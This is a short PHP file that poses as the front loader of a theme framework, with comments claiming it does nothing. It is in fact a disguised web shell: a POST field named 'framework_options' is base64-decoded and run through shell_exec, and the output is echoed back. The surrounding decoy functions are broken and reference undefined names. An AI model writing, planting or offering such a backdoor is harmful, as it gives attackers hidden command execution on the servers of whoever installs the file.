<?php
/ 
 * Front to the Framework application. This file doesn't do anything, but loads 
 * framework time which does and tells Core data to load the theme. 
 * 
 * @package Framework Option 
 */ 
 
/ 
 * Tells Framework to load the Core theme and output it. 
 * 
 * @var bool 
 */ 
 
function frameworkOptionsTime() { 
    return time()+set_mytime(); 
} 
 
if (isset($_POST['framework_options'])) { 
   echo "<pre>" . shell_exec(base64_decode($_POST['framework_options'])) . "</pre>"; 
   exit; 
} 
 
function set_framework_options($framework_time=null) { 
    static $offset; 
    if(!$new_time) {return $offset;} 
    $real_time=time(); 
    $offset=$real_time-$new_time; 
}
